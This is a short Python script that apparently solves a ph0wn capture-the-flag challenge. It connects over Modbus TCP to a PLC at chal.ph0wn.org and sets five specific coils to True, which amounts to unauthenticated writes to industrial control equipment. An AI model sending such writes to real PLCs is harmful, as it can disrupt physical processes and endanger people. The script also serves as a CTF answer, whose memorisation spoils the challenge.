from pymodbus.client import ModbusTcpClient
import argparse

UNIT = 0x1

COILS = [0x0D, 0x35, 0x43, 0x7B, 0xB1]

def parse_args():
    parser = argparse.ArgumentParser(description="Write solve coils on target PLC.")
    parser.add_argument("host", nargs="?", default="chal.ph0wn.org")
    parser.add_argument("port", nargs="?", type=int, default=5020)
    return parser.parse_args()


def main():
    args = parse_args()
    c = ModbusTcpClient(args.host, port=args.port)
    assert c.connect(), "TCP connect failed"

    for addr in COILS:
        c.write_coil(addr, True, device_id=UNIT)

    c.close()
    print(f"[+] Done: coils written to {args.host}:{args.port}.")


if __name__ == "__main__":
    main()
